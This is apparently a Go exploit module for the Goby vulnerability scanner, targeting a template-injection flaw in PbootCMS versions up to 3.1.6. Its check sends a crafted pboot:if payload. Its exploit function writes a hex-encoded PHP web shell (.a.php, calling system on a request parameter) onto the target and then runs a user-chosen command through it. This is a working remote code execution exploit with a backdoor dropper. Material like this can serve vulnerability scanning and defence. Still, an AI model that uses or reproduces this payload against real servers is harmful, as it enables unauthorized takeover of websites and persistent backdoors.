package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PbootCMS <=v3.1.6 ParserController Remote Code Execute",
    "Description": "<p>PbootCMS is a new kernel and permanent open source free PHP enterprise website development and construction management system, is a set of efficient, concise, powerful free commercial PHP CMS source code, can meet the needs of all kinds of enterprise website development and construction.</p><p>Template injection exists in PbootCMS V &lt;=3.1.6. Attackers can construct specific links to exploit this vulnerability and execute arbitrary codes to obtain server permissions.</p>",
    "Product": "PbootCMS",
    "Homepage": "https://www.pbootcms.com/",
    "DisclosureDate": "2022-07-13",
    "Author": "935565080@qq.com",
    "FofaQuery": "banner=\"Set-Cookie: pbootsystem=\" || header=\"Set-Cookie: pbootsystem=\" || title=\"PbootCMS\"",
    "GobyQuery": "banner=\"Set-Cookie: pbootsystem=\" || header=\"Set-Cookie: pbootsystem=\" || title=\"PbootCMS\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:https://www.pbootcms.com/</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2022-88321"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "PbootCMS <=v3.1.6 ParserController 前台任意代码执行漏洞",
            "Product": "PbootCMS",
            "Description": "<p><span style=\"font-size: 18px;\">PbootCMS是全新内核且永久开源免费的PHP企业网站开发建设管理系统，是一套高效、简洁、 强悍的可免费商用的PHP CMS源码，能够满足各类企业网站开发建设的需要。</span><br></p><p><span style=\"font-size: 18px;\"><span style=\"color: rgb(22, 51, 102); font-size: 18px;\">PbootCMS v&lt;=3.1.6版本中存在模板注入，攻击者可构造特定的链接利用该漏洞，执行任意代码，获取服务器权限。</span><br></span></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.pbootcms.com/\">https://www.pbootcms.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "PbootCMS <=v3.1.6 ParserController Remote Code Execute",
            "Product": "PbootCMS",
            "Description": "<p>PbootCMS is a new kernel and permanent open source free PHP enterprise website development and construction management system, is a set of efficient, concise, powerful free commercial PHP CMS source code, can meet the needs of all kinds of enterprise website development and construction.<br></p><p>Template injection exists in PbootCMS V &lt;=3.1.6. Attackers can construct specific links to exploit this vulnerability and execute arbitrary codes to obtain server permissions.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><a href=\"https://www.pbootcms.com/\">https://www.pbootcms.com/</a></span></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7316"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randString := goutils.RandomHexString(16)
			url := fmt.Sprintf("%s/?member/login/aaaaaa}{pboot:if(true);use/**/function/**/var_dump/**/as/**/test;use/**/function/**/md5/**/as/**/test1;use/**/function/**/get/**/as/**/test3;test(test1(test3('content')));if(true)}{/pboot:if}&content=%s", u.FixedHostInfo, randString)
			if resp, err := httpclient.SimpleGet(url); err == nil {
				d := []byte(randString)
				m := md5.New()
				m.Write(d)
				md5hash := hex.EncodeToString(m.Sum(nil))
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, md5hash) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := fmt.Sprintf("%s/?member/login/aaaaaa}{pboot:if(true);use/**/function/**/fputs/**/as/**/test;use/**/function/**/fopen/**/as/**/test1;use/**/function/**/get/**/as/**/test3;use/**/function/**/hex2bin/**/as/**/test4;test(test1(test3('file'),'w'),test4(test3('content')));if(true)}{/pboot:if}&file=.a.php&content=3c3f7068702073797374656d28245f524551554553545b276161275d293b3f3e", expResult.HostInfo.FixedHostInfo)
			if _, err := httpclient.SimpleGet(url); err == nil {
				shell := fmt.Sprintf("%s/.a.php?aa=%s", expResult.HostInfo.FixedHostInfo, ss.Params["cmd"])
				if resp, err := httpclient.SimpleGet(shell); err == nil {
					expResult.Success = true
					expResult.OutputType = "html"
					expResult.Output += resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
